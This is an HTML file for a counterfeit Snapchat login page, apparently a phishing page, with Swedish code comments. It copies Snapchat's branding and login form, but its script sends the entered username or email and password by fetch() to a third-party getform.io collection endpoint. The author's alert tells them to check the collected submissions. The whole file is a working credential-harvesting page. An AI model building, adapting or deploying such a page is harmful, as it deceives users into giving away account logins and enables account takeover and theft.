<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
  <link rel="shortcut icon" href="img/faviconV2.png" />
  <link rel="stylesheet" href="/css/login.css" />
  <title>Login • Snapchat</title>
</head>
<body>
  <button class="back-button" onclick="window.location.href='/Acconts.html';">
    <img src="img/left-arrow.png" height="15" width="15" alt="">
  </button>

  <div class="login-container">
    <h1>Log In</h1>

    <form id="loginForm" action="https://getform.io/f/aolzjgrb" method="POST">
      <label for="username">USERNAME OR EMAIL</label>
      <input type="text" id="username" name="username" required />

      <p class="alternate-option">
        <a href="#" id="switch-to-phone">Use phone number instead</a>
      </p>

      <label for="password">PASSWORD</label>
      <div class="password-container">
        <input type="password" id="password" name="password" required />
        <button type="button" class="toggle-password">
          <img src="img/eye-closed.svg" id="eye-icon" width="20" height="20" alt="eye icon" />
        </button>
      </div>

      <div class="save-info">
        <input type="checkbox" id="save-login" name="saveLogin" />
        <label for="save-login">Save Login Info on your device</label>
      </div>

      <p class="forgot-password">
        <a href="https://accounts.snapchat.com/">Forgot your password?</a>
      </p>

      <button type="submit" class="login-button">Log In</button>
    </form>
  </div>

  <script>
    // Visa/­dölj lösenord
    document.querySelector('.toggle-password').addEventListener('click', () => {
      const pw = document.getElementById('password');
      const eye = document.getElementById('eye-icon');
      if (pw.type === 'password') {
        pw.type = 'text';
        eye.src = 'img/eye-open.svg';
      } else {
        pw.type = 'password';
        eye.src = 'img/eye-closed.svg';
      }
    });

    // Enkel bekräftelse vid skick
    document.getElementById('loginForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const form = e.target;
      const data = new FormData(form);
      try {
        const res = await fetch(form.action, {
          method: 'POST',
          body: data,
          headers: { Accept: 'application/json' }
        });
        if (res.ok) {
          alert('✅ Inskickat! Kolla Getform.io submissions.');
          form.reset();
        } else {
          alert('⚠️ Något gick fel: ' + res.statusText);
        }
      } catch (err) {
        alert('❌ Fel: ' + err.message);
      }
    });
  </script>
</body>
</html>
